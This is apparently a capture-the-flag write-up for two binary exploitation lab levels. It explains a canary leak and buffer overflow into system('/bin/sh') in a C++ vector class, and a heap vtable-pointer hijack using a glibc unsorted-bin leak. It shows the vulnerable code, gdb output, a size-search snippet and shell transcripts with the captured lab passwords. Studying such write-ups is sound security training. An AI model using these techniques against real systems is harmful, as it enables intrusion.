## lab9C

Our first ```C++``` lab!

We have a class template here:

```cpp
template <class T>
class DSVector {
    public:
                     // I don't like indexing from 0, I learned VB.NET first.
        DSVector() : len(1), alloc_len(len+256) {}
        unsigned int size() { return len; }
        void append(T item);
                                            // No info leaks, either!
        T get(unsigned int index) { return (index < alloc_len ? vector_data[index] : -1); };
    private:
        unsigned int alloc_len;
        unsigned int len;
        // I was asleep during the dynamic sizing part, at least you can't overflow!
        T vector_data[1+256];
};

template <class T>
void
DSVector<T>::append(T item)
{
    // No overflow for you!
    if (len >= alloc_len) {
        std::cout << "Vector is full!" << std::endl;
        return;
    }
    vector_data[this->len++] = item;
}
```

In ```main``` we see that we initialize an ```int vector``` of that class:

```cpp
DSVector test1;
```

So we can ```append``` an item to the ```stack``` or ```read``` one of the items by specifying its ```indexes```. Unlike a previous challenge, we cannot input a negative index to read off the stack because

```cpp
index < alloc_len ? vector_data[index] : -1);
```

is executed in memory as an ```unsigned comparison```. How are we to pwn this? Looking at ```checksec```:

```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

We also have to get the value of ```canary```. Since ```test1.get()``` is the only function that gives us back information, we have to look for ways we can use it to have an ```information leak```, which means we have to somehow pass the check.

The check involves the value of ```alloc_len```. We can see that, in code, it was initialized kinda goofy. What turns out in reality is that ```alloc_len``` was initialized AFTER ```len```, which means it was set incorrectly, which allows us to read indexes beyond the limits of the buffer.

With this in mind we can easily read the value of the ```canary``` and, using the value of ```ret```, we can find the addresses of ```system``` and a string ```"/bin/sh"```.

Now we simply have to overflow the buffer with calls to ```test1.append()```, which works because it passes the ```if check```:

```cpp
// No overflow for you!
if (len >= alloc_len) {
  std::cout << "Vector is full!" << std::endl;
      return;
}
vector_data[this->len++] = item;
```

```
canary is at vector_data[257]
ret is at vector_data[261]
system is at ret + 0x2670d
string is at ret + 0x146fa1
```

```bash
+------- DSVector Test Menu -------+
| 1. Append item                   |
| 2. Read item                     |
| 3. Quit                          |
+----------------------------------+
Enter choice:
+------- DSVector Test Menu -------+
| 1. Append item                   |
| 2. Read item                     |
| 3. Quit                          |
+----------------------------------+
Enter choice:
+------- DSVector Test Menu -------+
| 1. Append item                   |
| 2. Read item                     |
| 3. Quit                          |
+----------------------------------+
Enter choice:
+------- DSVector Test Menu -------+
| 1. Append item                   |
| 2. Read item                     |
| 3. Quit                          |
+----------------------------------+
Enter choice: $ whoami
lab9A
$ cat /home/lab9A/.pass
1_th0uGht_th4t_w4rn1ng_wa5_l4m3
```

## lab9A

Here we have a 2 classes, the first one being used by the second one.

```c
class hash_num {
    public:
        // I'm no mathematician
        unsigned int
        operator() (unsigned int const &key) const {
            return key;
        }
};

// Hashset
templateHashFunc>
class HashSet {
    public:
        HashSet(unsigned int size) : m_size(size), set_data(new T[size]) {}
        virtual ~HashSet() { delete [] set_data; }
        virtual void add(T val);
        virtual unsigned int find(T val);
        virtual T get(unsigned int);
    private:
        unsigned int m_size;
        HashFunc m_hash;
        T *set_data;
};
typedef HashSet hashset_int;
```

The methods of the second class are pretty annoying. We cannot ```add``` any value we want wherever we want in the ```int array``` or get the ```value``` of the element by simply giving the ```index```.

```c
template<class T, class HashFunc>
void
HashSet<T, HashFunc>::add(T val)
{
    int index = this->m_hash(val) % this->m_size;
    this->set_data[index] = val;
}
```

One interesting thing is that we don't have any restriction on the size of our array.

Well, in order to exploit this challenge, it is pretty obvious that we will have to change the ```pointer``` to the ```virtual table``` (```vpointer```) of an ```object```, so that we can call ```system()``` instead of one the methods on the table.

We would first need to find the address of ```system```. By allocating and deallocating on the ```heap```, one of our allocated ```int arrays``` will be placed in the ```unsorted binlist``` and, therefore, its first 8 bytes will contain a ```forward pointer``` and ```backwards pointer``` pointing over there.

Having this ```binlist``` address we can calculate the address of ```system``` and of a string ```"/bin/sh"```.

We will place it on the ```heap```. We don't have control over which ```index``` in the array pointed by```*set_data``` will it be placed into - it will be at index ```[address % m_size]```.

Since ```vpointer``` is basically a ```pointer``` to a ```function pointer```, we have to get the ```address``` of where on the ```heap``` our ```system``` address is currently located into.

We can accomplish this by ```allocating``` 2 ```HashSet objects```, ```freeing``` them and ```allocating``` a big one over them with the power of ```glibc``` Voodo. As such, we can get the ```heap``` address which is second object's ```*set_data```. However, we won't use this address, because it will overwrite the ```constructor``` function, which isn't exactly the best one to overwrite. We will instead overwrite the ```Hashet::add```, which is the ```3rd``` function (+8), so we have to subtract 8 from the ```heap address``` we found.

Now, we have ```system``` on the ```heap``` and a cool ```fake vpointer```. We simply have to change the ```vpointer``` of an ```object``` with it. We will change the second object's since we can already access it after ```allocating``` an object over it.

Because of the annoying allocate value at index ```[value % m_size]```, we have to somehow figure a way to get around this. In my case, I had to put the fake vpointer on index ```[102]```. That means that ```vpointer % m_size = 102```. The only value we can and have to change here is ```m_size```.
I went through a for loop to find good suitable sizes.

```python
size = -1
for i in range(103, 30000):
    if vpointer % i == 102:
        size = i
        break

if size == -1:
    print "Error, try again"
    exit()
```

We start iterating from ```103``` because it's the first integer with whom we can divide with have 102 as the remainder. We iterate until 30000 because I found out that a little bit more won't ```allocate``` our ```set_data``` over the ```old objects``` since it's too large.
In case it doesn't find a suitable size (doesn't happen that often but it does), it will exit.

So perfect! We found our ```size```, ```freed``` the ```old obj``` and put a new one over it with the corresponding ```size``` and placed the ```vpointer``` exactly where we wanted!

However the business is left unfinished. Because of the way ```methods``` work, the ```first argument``` will always be a ```this``` pointer, a ```pointer``` to the ```object``` itself, which means that when we call ```system``` the argument it receives won't be a pointer to our ```string```.

This was the most difficult part and I couldn't figure it out on my own, unlike all the previous challenges.

I managed to get a tip:
Instead of calling ```system```, call ```system+1```

If we look at the disassembly of ```system```, we can see that the first instruction is a ```push``` instruction, most likely saving old registers. If we jump over this step, when ```eax``` gets the value of the first argument, it will actually get the value right before - our ```pointer``` to string! This is very very neat!

```asm
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb7d5d190 <__libc_system>
gdb-peda$ x/i 0xb7d5d190
   0xb7d5d190 <__libc_system>:	push   ebx
gdb-peda$ 
   0xb7d5d191 <__libc_system+1>:	sub    esp,0x8
gdb-peda$ 
   0xb7d5d194 <__libc_system+4>:	mov    eax,DWORD PTR [esp+0x10]
```

There were some issues that I had while researching for this problem, particularly how ```glibc``` works. Turns out, while ```consolidating```, it is possible to ```coalesce``` fast chunks, which actually happened at one point during my tests and couldn't figure it out why!

```bash
lab9A@warzone:/tmp/transcen/lab09$ python expl9A.py
[+] Opening connection to 172.16.37.128 on port 9941: Done
[*] libc: 0xb76be450
[*] heap: 0x966f1f8
[*] system: 0xb7554191
[*] vpointer: 0x966f164
[*] Switching to interactive mode
+----------- clark's improved item storage -----------+
| [ -- Now using HashSets for insta-access to items!  |
| 1. Open a lockbox                                   |
| 2. Add an item to a lockbox                         |
| 3. Get an item from a lockbox                       |
| 4. Destroy your lockbox and items in it             |
| 5. Exit                                             |
+-----------------------------------------------------+
Enter choice: Which lockbox?: Item value: $ whoami
lab9end
$ cat /home/lab9end/.pass
1_d1dNt_3v3n_n33d_4_Hilti_DD350
```
